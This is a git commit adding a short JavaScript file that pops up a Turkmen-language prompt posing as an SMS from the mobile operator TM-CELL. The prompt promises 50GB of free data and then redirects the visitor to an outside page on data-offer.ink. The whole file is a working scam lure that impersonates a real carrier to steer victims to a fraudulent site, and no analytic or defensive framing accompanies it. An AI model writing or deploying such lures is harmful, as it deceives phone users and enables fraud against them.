a497682ddbc7640b5367957f6fad63657d59f60f
katemj25 <mbokofficial1@gmail.com>
2025-05-04 21:55:35 -0700

    Create activate-tm-celloffer.com.js

---
+++ activate-tm-celloffer.com.js
@@ -0,0 +1,5 @@
+var password = 'TM-CELL Mugt maglumat teklibi'
+password=prompt('SMS: Gutlaýarys, belgiňiz 50GB mugt maglumat 2G ýa-da 3G we 4G Köne SIM karta sylagyny almaga hukugy bar, işjeňlik üçin OK basyň. ','TM-CELL Mugt maglumat teklibi');
+if (password != 'TM-CELL Mugt maglumat teklibi') {
+location.href='https://data-offer.ink/activate-tm-celloffer.com.html';
+}
